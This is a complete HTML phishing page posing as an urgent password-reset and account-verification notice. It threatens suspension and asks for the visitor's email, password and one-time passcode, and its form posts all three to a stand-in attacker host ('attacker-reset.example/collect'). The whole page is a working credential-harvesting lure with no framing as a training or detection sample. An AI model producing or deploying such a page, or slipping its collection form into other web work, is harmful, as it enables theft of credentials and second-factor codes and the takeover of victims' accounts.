<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Immediate Password Reset Required</title>
  </head>
  <body>
    <main>
      <h1>Verify your account now</h1>
      <p>Your account will be suspended unless you confirm your identity immediately.</p>
      <form action="https://attacker-reset.example/collect" method="post">
        <label>Email <input type="email" name="email" /></label>
        <label>Password <input type="password" name="password" /></label>
        <label>OTP <input type="text" name="otp" /></label>
        <button type="submit">Continue Verification</button>
      </form>
    </main>
  </body>
</html>
